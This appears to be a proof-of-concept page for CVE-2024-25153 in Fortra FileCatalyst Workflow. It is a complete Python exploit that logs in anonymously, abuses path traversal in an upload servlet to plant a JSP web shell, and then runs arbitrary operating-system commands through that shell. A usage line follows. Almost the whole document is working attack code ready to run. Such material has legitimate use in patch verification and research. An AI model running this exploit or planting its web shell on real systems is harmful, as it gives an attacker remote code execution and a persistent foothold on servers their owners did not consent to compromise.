## Fortra FileCatalyst Workflow远程代码执行漏漏洞(CVE-2024-25153)


## poc
```python
#!/usr/bin/python3
"""

Exploit for CVE-2024-25153: Remote Code Execution in Fortra FileCatalyst Workflow 5.x, before 5.1.6 Build 114
Full details can be found at https://labs.nettitude.com/blog/cve-2024-25153-remote-code-execution-in-fortra-filecatalyst

Usage:  CVE-2024-25153.py --host {hostname} --port {port} --url {url} --cmd {command}

"""
import requests
import argparse
import re
import uuid
import urllib.parse

def exploit(host, port, url, cmd, secret):
    s = requests.Session()
    try:
        session_response = s.get(f"{host}:{port}/{url}")
        
        # Find session token
        session_pattern = "\/workflow\/jsp\/logon.jsp;jsessionid=[A-Za-z0-9]+"
        
        if(re.search(session_pattern,session_response.text) is None):
           print("[-] => Error getting session token. Check the -u parameter is correct.")
           return
        
        # Redirect to main login
        redirect = re.findall(session_pattern, session_response.text)[0]
        redirect_response = s.get(f"{host}:{port}{redirect}")
        
        # Perform anonymous login
        login_pattern = "\/workflow\/logonAnonymous.do\?FCWEB.FORM.TOKEN=[A-Za-z0-9]+"
        
        if(re.search(login_pattern,redirect_response.text) is None):
           print("[-] => Error logging in. Check anonymous login is enabled.")
           return
           
        login = re.findall(login_pattern, redirect_response.text)[0]
        
        login_response = s.get(f"{host}:{port}{login}")
        
        # Upload our shell        
        exploit_url = f"{host}:{port}/{url}/servlet/ftpservlet?wf=octetStream&h=example.com&u=%58%58&p=%58%58&prt=21&c=PUT&sid=CVE-2024-25153/../../CVE-2024-25153/"; # WARNING: Take great care if modifying the upload path (sid parameter). Attempting to upload in the top-level web root will delete the entire application.
        exploit_headers = {"User-Agent": "CVE-2024-25153", "Content-Type": "application/octet-stream", "X-File-Name": secret + ".jsp"}
        exploit_data = """<%@ page import=\"java.util.*,java.io.*\"%>
        <%
        if (request.getParameter(\"cmd\") != null) {
           Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));
           OutputStream os = p.getOutputStream();
           InputStream in = p.getInputStream();
           DataInputStream dis = new DataInputStream(in);
           String disr = dis.readLine();
           while ( disr != null ) {
              out.println(disr);
              disr = dis.readLine();
           }
         }
         %>"""
        exploit_response = s.post(exploit_url, headers=exploit_headers, data=exploit_data)
        
        if("success" not in exploit_response.text):
           print("[-] => Error uploading file. Target may not be vulnerable.")
           return
        
        # Call the shell
        cmd_safe = urllib.parse.quote(cmd)
        cmd_response = s.get(f"{host}:{port}/{url}/CVE-2024-25153/{secret}.jsp?cmd={cmd_safe}")
        print(cmd_response.text.strip())
        

    except requests.exceptions.RequestException as e:
        print(f"[-] => Error occurred for {url}. Target may not be vulnerable.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--host", type=str, help="target hostname or IP address (include http:// or https://)", required=True)
    parser.add_argument("-p","--port", type=int, default=8080, help="target port (Default: 8080)")
    parser.add_argument("-u","--url", type=str, default="workflow", help="URL where FileCatalyst Workflow is installed (Default: workflow)")
    parser.add_argument("-c","--cmd", type=str, default="id", help="OS command to run (Default: id)")
    args = parser.parse_args()
    
    exploit(args.host, args.port, args.url, args.cmd, str(uuid.uuid4()))
```

```
CVE-2024-25153.py --host <hostname> --port <port> --url <url> --cmd <command>
```
